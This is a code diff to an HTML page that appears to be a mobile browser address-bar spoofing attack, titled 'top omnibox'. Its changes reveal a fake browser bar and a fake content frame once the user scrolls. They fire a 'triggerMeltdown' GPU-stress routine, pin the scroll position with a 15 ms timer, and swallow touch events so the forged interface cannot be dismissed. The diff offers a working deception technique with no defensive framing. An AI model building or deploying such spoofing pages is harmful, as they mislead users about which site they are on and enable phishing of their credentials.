@@ -4,20 +4,19 @@
     <meta charset="UTF-8" />
     <meta
       name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
     />
-    <title>azzzab</title>
+    <title>top omnibox</title>
     <style>
       body,
       html {
         margin: 0;
         padding: 0;
         width: 100%;
-        height: 200vh;
+        height: 250vh;
         background-color: #f8f9fa;
         font-family: sans-serif;
-        scroll-behavior: smooth;
-        overflow-x: hidden;
+        overscroll-behavior-y: none !important;
       }
       #scroll-bait {
         display: flex;
@@ -38,6 +37,7 @@
         height: 100vh;
         z-index: 99999;
         background: #fff;
+        touch-action: none !important;
       }
       #fake-bar {
         position: absolute;
@@ -47,23 +47,21 @@
         height: 56px;
         object-fit: contain;
         border-bottom: 1px solid #ddd;
-        z-index: 10;
+        z-index: 10000;
         opacity: 0;
         transition: opacity 0.1s ease-in;
-        pointer-events: none;
+        pointer-events: auto;
+        -webkit-user-drag: none;
       }
       #fake-content {
         position: absolute;
-        top: 0;
+        top: 56px;
         left: 0;
         width: 100%;
-        height: 100vh;
+        height: calc(100vh - 56px);
         border: none;
         z-index: 1;
         display: block;
-        transition:
-          top 0.1s ease-in,
-          height 0.1s ease-in;
       }
       #gpu-killer {
         position: fixed;
@@ -110,12 +108,21 @@
         () => {
           if (window.scrollY > 80 && !isSpoofed) {
             isSpoofed = true;
-            document.getElementById("fake-ui").style.display = "block";
-            triggerMeltdown();
-            window.scrollTo(0, 0);
+
             setTimeout(() => {
-              document.getElementById("gpu-killer").innerHTML = "";
-            }, 1000);
+              document.getElementById("fake-ui").style.display = "block";
+              triggerMeltdown();
+
+              window.scrollTo(0, 50);
+
+              setTimeout(() => {
+                document.getElementById("gpu-killer").innerHTML = "";
+              }, 1000);
+            }, 10);
+          }
+
+          if (isSpoofed) {
+            if (window.scrollY <= 5) window.scrollTo(0, 10);
           }
         },
         { passive: true },
@@ -124,21 +131,32 @@
       window.addEventListener("message", (e) => {
         if (e.data === "SNAP_TRAP") {
           let fakeBar = document.getElementById("fake-bar");
-          let fakeContent = document.getElementById("fake-content");
           fakeBar.style.opacity = "1";
           fakeBar.style.pointerEvents = "auto";
-          fakeContent.style.top = "56px";
-          fakeContent.style.height = "calc(100vh - 56px)";
+
+          setInterval(() => {
+            if (isSpoofed) {
+              if (window.scrollY < 40 || window.scrollY > 60) {
+                window.scrollTo(0, 50);
+              }
+            }
+          }, 15);
         }
       });
 
-      document.getElementById("fake-bar").addEventListener(
-        "touchmove",
-        (e) => {
-          if (isSpoofed) e.preventDefault();
-        },
-        { passive: false },
-      );
+      const fb = document.getElementById("fake-bar");
+      ["touchstart", "touchmove", "touchend"].forEach((evt) => {
+        fb.addEventListener(
+          evt,
+          (e) => {
+            if (isSpoofed) {
+              e.preventDefault();
+              e.stopPropagation();
+            }
+          },
+          { passive: false },
+        );
+      });
     </script>
   </body>
 </html>
